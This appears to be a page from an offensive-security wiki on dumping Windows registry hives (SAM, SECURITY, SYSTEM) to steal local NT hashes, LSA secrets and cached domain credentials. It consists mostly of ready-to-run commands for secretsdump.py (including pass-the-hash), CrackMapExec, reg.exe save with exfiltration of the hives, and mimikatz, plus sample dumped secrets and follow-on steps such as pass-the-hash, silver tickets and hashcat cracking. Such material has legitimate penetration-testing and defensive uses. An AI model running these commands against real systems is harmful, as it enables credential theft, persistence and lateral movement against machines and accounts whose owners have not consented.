**Dump the Windows registry hives (SAM / SECURITY / SYSTEM)** — with local admin or `SYSTEM` on a host you can extract the three hives that hold its secrets: local account NT hashes (SAM), LSA secrets and cached domain logons (SECURITY), and the boot key that decrypts them (SYSTEM).

What you get:
- **SAM** - NT hashes of local accounts (including the local `Administrator`).
- **SECURITY (LSA secrets)** - the machine account password, service account passwords, the `DPAPI_SYSTEM` key, and cached domain credentials (`$MACHINE.ACC`, `DCC2` / MS-Cache v2 hashes).
- **SYSTEM** - the boot key (a.k.a. syskey) needed to decrypt the other two.

## Discovery

None in particular - you already need local admin / `SYSTEM` on the target.

## Exploitation

### Remotely (secretsdump.py)

Dumps SAM + LSA secrets over the wire. Accepts a password, an NT hash (pass-the-hash) or a Kerberos ticket.

```bash

secretsdump.py 'DOMAIN/USER_NAME:USER_PASS@TARGET'
# Pass-the-hash
secretsdump.py -hashes ':LOCAL_ADMIN_NT_HASH' 'TARGET/Administrator@TARGET'
# Only the local SAM / only LSA secrets
secretsdump.py 'DOMAIN/USER_NAME:USER_PASS@TARGET' -sam
secretsdump.py 'DOMAIN/USER_NAME:USER_PASS@TARGET' -security

```

Example - an LSA secret carrying a `SYSTEM` DPAPI user key (needed e.g. for [SCCM NAA Credentials](../SCCM%20Attacks/SCCM%20NAA%20Credentials.md)):

```console

[*] Dumping LSA Secrets
...
dpapi_userkey:0x00bed1ba...debd90fd6b7b7d3a3
[*] Dumping cached domain logon information (domain/username:hash)
DOMAIN.LOCAL/svc_backup:$DCC2$10240#svc_backup#a1b2...  <- crackable, hashcat -m 2100

```

### Remotely (CrackMapExec / NetExec)

```bash

cme smb TARGET -u 'USER_NAME' -p 'USER_PASS' --sam
cme smb TARGET -u 'USER_NAME' -p 'USER_PASS' --lsa
cme smb TARGET -u 'USER_NAME' -H 'LOCAL_ADMIN_NT_HASH' --local-auth --sam

```

### Locally - save the hives, then dump offline

On the target (admin cmd), export the three hives, exfiltrate them, and decrypt offline. Doing it offline avoids touching LSASS and is quieter.

```cmd

reg.exe save HKLM\SAM      C:\Temp\sam.save
reg.exe save HKLM\SECURITY C:\Temp\security.save
reg.exe save HKLM\SYSTEM   C:\Temp\system.save

```

Copy the files off, then:

```bash

secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

```

### Locally - mimikatz

```powershell

privilege::debug
token::elevate
lsadump::sam        # local SAM hashes
lsadump::secrets    # LSA secrets (needs SYSTEM)

```

## Post-exploitation

- Local `Administrator` NT hash -> pass-the-hash to other hosts sharing it, see [Windows Remote Command Execution](../Lateral%20Movement/Windows%20Remote%20Command%20Execution.md).
- Machine account (`$MACHINE.ACC`) NT hash -> you already had `SYSTEM` here, so use it for persistence / re-entry (forge silver tickets to this host later, or re-derive access without re-exploiting). The same secret drives [Machine Account to Local Admin (S4U2self)](../Delegation%20Attacks/Computer%20Account%20to%20Local%20Admin.md) - which is only worth it when the secret was obtained *without* prior admin.
- Cached domain logons (`DCC2`) -> crack with `hashcat -m 2100`, see [Windows Password Cracking](Windows%20Password%20Cracking.md).
- On a Domain Controller you would instead dump the domain database, see [Dump NTDS.dit](Dump%20NTDS.dit.md).

## Caution

Delete any hive files you saved to disk (`C:\Temp\*.save`) during cleanup.

## References

- impacket (secretsdump.py) - https://github.com/fortra/impacket
- CrackMapExec / NetExec - https://github.com/Pennyw0rth/NetExec
- mimikatz - https://github.com/gentilkiwi/mimikatz
